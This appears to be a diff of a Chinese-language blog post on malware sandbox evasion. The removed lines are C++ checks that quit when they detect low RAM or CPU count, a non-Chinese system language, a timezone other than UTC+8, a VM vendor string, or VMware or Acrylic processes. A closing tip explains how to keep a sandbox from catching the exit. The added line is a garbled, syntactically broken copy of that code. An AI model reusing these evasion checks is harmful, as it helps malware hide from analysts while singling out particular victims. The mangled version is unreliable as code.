@@ -659,66 +659,7 @@ Ethernet adapter Ethernet 4:
     GetSystemInfo(&sysinfo);
 
     float fMemSize = (float)statex.ullTotalPhys / (1024 * 1024 * 1024);
-    if (fMemSize < 3 || sysinfo.dwNumberOfProcessors <3 )
-    &#123;
-        *Flag = TRUE;
-        throw err;
-    &#125;
- 
-    // 检测系统语言，非中文则退出
-    LANGID lid = GetSystemDefaultLangID();
-    if (lid != 0x0804) &#123;
-        *Flag = TRUE;
-        throw err;
-    &#125;
-
-    // 检测时区是否为东八区
-    TIME_ZONE_INFORMATION tzinfo;
-    GetTimeZoneInformation(&tzinfo);
-    if ((tzinfo.Bias / (-60)) != 8) &#123;
-        *Flag = TRUE;
-        throw err;
-
-    &#125;
-
-    // 检测计算机制造商和型号中带有 virtual 、vmware、qemu 、hyper、docker关键字
-    string sWMIResult;
-    GetManufacturerModelByWMI(&sWMIResult);
-    if (sWMIResult.find("virtual") !=sWMIResult.npos ||
-        sWMIResult.find("qemu") != sWMIResult.npos ||
-        sWMIResult.find("vmware") != sWMIResult.npos ||
-        sWMIResult.find("docker") != sWMIResult.npos ||
-        sWMIResult.find("hyper") != sWMIResult.npos) &#123;
-        *Flag = TRUE;
-        throw err;
-    &#125;
-
-
-
-    // 检测进程 AcrylicService.exe    vmtoolsd.exe
-    HANDLE hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
-    PROCESSENTRY32 processEntry32 = &#123; sizeof PROCESSENTRY32 &#125;;
-    BOOL bSuccess = Process32First(hSnapshot, &processEntry32);
-    if (bSuccess)
-    &#123;
-        do
-        &#123;
-            char szProcessBuf[MAX_PATH] = &#123; 0 &#125;;
-            sprintf(szProcessBuf, "%ls",processEntry32.szExeFile);
-            if (strcmp(szProcessBuf, "AcrylicService.exe") == 0 ||
-                strcmp(szProcessBuf, "vmtoolsd.exe") == 0 
-                ) &#123;
-                *Flag = TRUE;
-                throw err;
-            &#125;
-
-
-        &#125; while (Process32Next(hSnapshot, &processEntry32));
-    &#125;
-
-
-&#125;
-</code></pre>
+    if (fMemSize < 3 || sysinfo.dwNumberOfProcessors <3 0 ) &#123; *flag="TRUE;" throw err; &#125; 检测系统语言，非中文则退出 langid lid="GetSystemDefaultLangID();" if (lid !="0x0804)" 检测时区是否为东八区 time_zone_information tzinfo; gettimezoneinformation(&tzinfo); ((tzinfo.bias (-60)) 检测计算机制造商和型号中带有 virtual 、vmware、qemu 、hyper、docker关键字 string swmiresult; getmanufacturermodelbywmi(&swmiresult); (swmiresult.find("virtual") || swmiresult.find("qemu") swmiresult.find("vmware") swmiresult.find("docker") swmiresult.find("hyper") 检测进程 acrylicservice.exe vmtoolsd.exe handle hsnapshot="CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS," 0); processentry32 sizeof &#125;; bool bsuccess="Process32First(hSnapshot," &processentry32); (bsuccess) do char szprocessbuf[max_path]="&#123;" sprintf(szprocessbuf, "%ls",processentry32.szexefile); (strcmp(szprocessbuf, "acrylicservice.exe")="=" strcmp(szprocessbuf, "vmtoolsd.exe")="=" while (process32next(hsnapshot, &processentry32)); < code></3></code></pre>
 </li>
 <li><p>主逻辑 ，一定要放一个Flag，不然抛出去的异常可能会被沙箱接收处理，程序并不会退出，所以需要根据flag判断更改逻辑。</p>
 <blockquote>
